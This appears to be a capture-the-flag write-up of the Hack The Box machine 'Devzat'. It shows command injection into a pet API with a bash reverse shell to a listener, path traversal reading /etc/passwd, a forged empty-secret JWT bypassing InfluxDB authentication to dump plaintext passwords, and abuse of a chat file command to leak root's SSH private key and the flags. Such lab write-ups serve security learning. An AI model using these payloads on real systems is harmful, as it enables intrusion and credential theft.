# Devzat

# Enumeration

````
$ nmap -sS --top-ports 100 10.10.11.118 -oG 10.10.11.118-sS
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 17:21 EST
Nmap scan report for devzat.htb (10.10.11.118)
Host is up (0.16s latency).
Not shown: 97 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
````
22/tcp

80/tcp

8000/tcp

````
$ nmap -A -sV -sC -p22,80,8000 10.10.11.118 -oG 10.10.11.118-AsVC
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 17:22 EST
Nmap scan report for devzat.htb (10.10.11.118)
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: devzat - where the devs at
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=2/26%Time=621AA839%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   159.69 ms 10.10.14.1
2   153.87 ms devzat.htb (10.10.11.118)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.40 seconds
````

````
$ gobuster vhost -u devzat.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt | grep 200
Found: 2009.devzat.htb (Status: 302) [Size: 283]                          
Found: 2008.devzat.htb (Status: 302) [Size: 283]                          
Found: pets.devzat.htb (Status: 200) [Size: 510]
````
pets.devzat.htb

The pets.devzat.htb seems to has a vulnerable component to command injection in its API's endpoint /api/pet:

POST request:
````json
{"name":"&& ping 10.10.15.6","species":"bluewale"}
````

GET response:
````json
"characteristics":"exit status 1"
````

````http
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 67
Connection: close

{"name":"&& ping 10.10.15.6","species":"bluewale"}
````

````http
GET /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Connection: close


````

````http
HTTP/1.1 200 OK
Date: Wed, 16 Mar 2022 10:24:58 GMT
Server: My genious go pet server
Content-Type: text/plain; charset=utf-8
Vary: Accept-Encoding
Content-Length: 2188
Connection: close

[{"name":"Cookie","species":"cat","characteristics":"Having a cat is like living in a shared apartment. Most of the time you mind your own business. From time to time you hang out together watching TV. And sometimes you find puke somewhere...\n"},{"name":"Mia","species":"cat","characteristics":"Having a cat is like living in a shared apartment. Most of the time you mind your own business. From time to time you hang out together watching TV. And sometimes you find puke somewhere...\n"},{"name":"Chuck","species":"dog","characteristics":"A dog will teach you unconditional love. If you can have that in your life, things won't be too bad."},{"name":"Balu","species":"dog","characteristics":"A dog will teach you unconditional love. If you can have that in your life, things won't be too bad."},{"name":"Georg","species":"gopher","characteristics":"Gophers use their long teeth to help build tunnels – to cut roots, loosen rocks and push soil away. Gophers have pouches in their cheeks that they use to carry food, hence the term “pocket” gopher. Gophers are generally solitary creatures that prefer to live alone except for brief mating periods."},{"name":"Gustav","species":"giraffe","characteristics":"With those extra long legs it is not surprising that a giraffe's neck is too short to reach the ground! Giraffes have a dark bluish tongue that is very long – approximately 50 centimetres (20 inches). Male giraffes fight with their necks."},{"name":"Rudi","species":"redkite","characteristics":"The wingspan of Red Kites can reach up to 170 cm (67 inch). Considering this large wingspan, the kites are very light birds, weighing no more than 0.9-1.3 kg (2.0-2.9 Punds)! The lifespan of Red Kites is usually around 4-5 years, but they can grow as old as 26 years of age! Red Kites have bright yellow legs and a yellow bill with a brown tip."},{"name":"Bruno","species":"bluewhale","characteristics":"The mouth of the blue whale contains a row of plates that are fringed with 'baleen', which are similar to bristles. Also the tongue of the blue whale is as big as an elephant."},{"name":"\u0026\u0026 ping 10.10.15.6","species":"bluewale","characteristics":"exit status 1"}]
````

````json
"characteristics":"exit status 1"
````

````
nmap -sCV -p22,80,8000 pets.devzat.htb -oA pets.devzat.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 06:21 EDT
Nmap scan report for pets.devzat.htb (10.10.11.118)
Host is up (0.15s latency).
rDNS record for 10.10.11.118: devzat.htb

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: Pet Inventory
| http-git: 
|   10.10.11.118:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: back again to localhost only 
| http-server-header: 
|   Apache/2.4.41 (Ubuntu)
|_  My genious go pet server
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=3/16%Time=6231BA31%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.08 seconds
````
pets.devzat.htb/.git/


# User

pets.devzat.htb/.git/

````
$ wget -r http://pets.devzat.htb/.git/
$ cd pets.devzat.htb

$ git status
$ git reset --hard HEAD
HEAD is now at ef07a04 back again to localhost only
````

There is a command injection vulnerability in main.go function loadCharacter in the species parameter:
````golang
func loadCharacter(species string) string {
    cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
    stdoutStderr, err := cmd.CombinedOutput()
    if err != nil {
        return err.Error()
    }            
    return string(stdoutStderr)
} 
````

````http
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 64
Connection: close

{"name":"blah","species":"../../../../../../../etc/passwd"}
````

````http
HTTP/1.1 200 OK
Date: Wed, 16 Mar 2022 11:17:41 GMT
Server: My genious go pet server
Content-Type: text/plain; charset=utf-8
Vary: Accept-Encoding
Content-Length: 4048
Connection: close

[{"name":"Cookie","species":"cat","characteristics":"Having a cat is like living in a shared apartment. Most of the time you mind your own business. From time to time you hang out together watching TV. And sometimes you find puke somewhere...\n"},{"name":"Mia","species":"cat","characteristics":"Having a cat is like living in a shared apartment. Most of the time you mind your own business. From time to time you hang out together watching TV. And sometimes you find puke somewhere...\n"},{"name":"Chuck","species":"dog","characteristics":"A dog will teach you unconditional love. If you can have that in your life, things won't be too bad."},{"name":"Balu","species":"dog","characteristics":"A dog will teach you unconditional love. If you can have that in your life, things won't be too bad."},{"name":"Georg","species":"gopher","characteristics":"Gophers use their long teeth to help build tunnels – to cut roots, loosen rocks and push soil away. Gophers have pouches in their cheeks that they use to carry food, hence the term “pocket” gopher. Gophers are generally solitary creatures that prefer to live alone except for brief mating periods."},{"name":"Gustav","species":"giraffe","characteristics":"With those extra long legs it is not surprising that a giraffe's neck is too short to reach the ground! Giraffes have a dark bluish tongue that is very long – approximately 50 centimetres (20 inches). Male giraffes fight with their necks."},{"name":"Rudi","species":"redkite","characteristics":"The wingspan of Red Kites can reach up to 170 cm (67 inch). Considering this large wingspan, the kites are very light birds, weighing no more than 0.9-1.3 kg (2.0-2.9 Punds)! The lifespan of Red Kites is usually around 4-5 years, but they can grow as old as 26 years of age! Red Kites have bright yellow legs and a yellow bill with a brown tip."},{"name":"Bruno","species":"bluewhale","characteristics":"The mouth of the blue whale contains a row of plates that are fringed with 'baleen', which are similar to bristles. Also the tongue of the blue whale is as big as an elephant."},{"name":"blah","species":"../../../../../../../etc/passwd","characteristics":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nsshd:x:111:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\npatrick:x:1000:1000:patrick:/home/patrick:/bin/bash\ncatherine:x:1001:1001:catherine,,,:/home/catherine:/bin/bash\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n"}]
````
+ root

+ patrick

+ catherine


````http
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
\User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 53
Connection: close


{"name":"blah","species":"blah; ping 10.10.15.6 -c1"}
````

````
# tcpdump -i tun0 -nnn icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
07:25:33.469610 IP 10.10.11.118 > 10.10.15.6: ICMP echo request, id 1, seq 1, length 64
07:25:33.469620 IP 10.10.15.6 > 10.10.11.118: ICMP echo reply, id 1, seq 1, length 64
````

````http
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 87
Connection: close

{"name":"blah","species":"blah; bash -c \" bash -i >& /dev/tcp/10.10.15.6/1337 0>&1\""}
````

````
# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.15.6] from (UNKNOWN) [10.10.11.118] 43342
bash: cannot set terminal process group (834): Inappropriate ioctl for device
bash: no job control in this shell
patrick@devzat:~/pets$
````

````
patrick@devzat:~/devzat$ ss -nlpt
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                         
LISTEN    0         4096             127.0.0.1:8443             0.0.0.0:*                                                                                       
LISTEN    0         4096             127.0.0.1:5000             0.0.0.0:*        users:(("petshop",pid=844,fd=3))                                               
LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*                                                                                       
LISTEN    0         4096             127.0.0.1:8086             0.0.0.0:*                                                                                       
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*                                                                                       
LISTEN    0         4096                     *:8000                   *:*        users:(("devchat",pid=859,fd=7))                                               
LISTEN    0         511                      *:80                     *:*                                                                                       
LISTEN    0         128                   [::]:22                  [::]:*                                                                                       
patrick@devzat:~/devzat$
````

````
patrick@devzat:~/devzat$ curl http://127.0.0.1:8086 -v
*   Trying 127.0.0.1:8086...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8086 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8086
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< Content-Type: text/plain; charset=utf-8
< X-Content-Type-Options: nosniff
< X-Influxdb-Build: OSS
< X-Influxdb-Version: 1.7.5
< Date: Wed, 16 Mar 2022 12:13:01 GMT
< Content-Length: 19
< 
404 page not found
* Connection #0 to host 127.0.0.1 left intact
<
````
X-Influxdb-Version: 1.7.5

## InfluxDB vuln
> InfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret). 
CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20933
Research's blog: https://www.komodosec.com/post/when-all-else-fails-find-a-0-day

This site shows how to query InfluxDB with curl
https://docs.influxdata.com/influxdb/v1.8/guides/query_data/#query-data-with-influxql

````
curl -G 'http://localhost:8086/query?pretty=true' --data-urlencode "db=mydb" --data-urlencode "q=SELECT \"value\" FROM \"cpu_load_short\" WHERE \"region\"='us-west'"
{
    "error": "unable to parse authentication credentials"
}
````

````python
import jwt      #pip install pyjwt https://pyjwt.readthedocs.io/en/stable/
import time
jwt.encode({"exp": time.time()+10000, "username":"admin"}, "", algorithm="HS256")
````

````
curl -G 'http://127.0.0.1:8086/query?pretty=true' --data-urlencode "db=mydb" --data-urlencode "q=SELECT \"value\" FROM \"cpu_load_short\" WHERE \"region\"='us-west'" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDc0NDQ4MDIuNDIyMjMzOCwidXNlcm5hbWUiOiJhZG1pbiJ9.XIGMScKMjU22mursx2ZTXr4zi38PBL4SHd3uiSMS9yI"
````


"q=SHOW DATABASES"
````
curl -G 'http://127.0.0.1:8086/query?pretty=true' --data-urlencode "q=SHOW DATABASES" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDc0NDQ4MDIuNDIyMjMzOCwidXNlcm5hbWUiOiJhZG1pbiJ9.XIGMScKMjU22mursx2ZTXr4zi38PBL4SHd3uiSMS9yI"
{"results":[{"statement_id":0,"series":[{"name":"databases","columns":["name"],"values":[["devzat"],["_internal"]]}]}]}
````
`devzat`
`_internal`


"SHOW Measurements"
````
curl -G 'http://127.0.0.1:8086/query?pretty=true' --data-urlencode "db=devzat" --data-urlencode "q=SHOW Measurements" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDc0NDQ4MDIuNDIyMjMzOCwidXNlcm5hbWUiOiJhZG1pbiJ9.XIGMScKMjU22mursx2ZTXr4zi38PBL4SHd3uiSMS9yI"
{"results":[{"statement_id":0,"series":[{"name":"measurements","columns":["name"],"values":[["user"]]}]}]}
````

"q=select * from \"user\""
````
curl -G 'http://127.0.0.1:8086/query?pretty=true' --data-urlencode "db=devzat" --data-urlencode "q=select * from \"user\"" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDc0NDQ4MDIuNDIyMjMzOCwidXNlcm5hbWUiOiJhZG1pbiJ9.XIGMScKMjU22mursx2ZTXr4zi38PBL4SHd3uiSMS9yI"
{"results":[{"statement_id":0,"series":[{"name":"user","columns":["time","enabled","password","username"],"values":[["2021-06-22T20:04:16.313965493Z",false,"WillyWonka2021","wilhelm"],["2021-06-22T20:04:16.320782034Z",true,"woBeeYareedahc7Oogeephies7Aiseci","catherine"],["2021-06-22T20:04:16.996682002Z",true,"RoyalQueenBee$","charles"]]}]}]}
````

````
patrick@devzat:~/devzat$ su - catherine
Password: 
catherine@devzat:~$ cat user.txt 
b758248e48eb2a66fb05450d4949e49e
````

# Root

````
catherine@devzat:~$ ssh -l catherine -p 8443 localhost
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups
         location.
catherine: k
patrick: I also put the main so you could diff main dev if you want.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat
catherine: all
catherine: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----
catherine: /file ../root.txt CeilingCatStillAThingIn2021?
[SYSTEM] 74c7326363e17c6207b1aa98b7cf9ef8
````


# Secrets

* FLAG_USER = b758248e48eb2a66fb05450d4949e49e
* FLAG_ROOT = 74c7326363e17c6207b1aa98b7cf9ef8

https://0xdf.gitlab.io/2022/03/12/htb-devzat.html
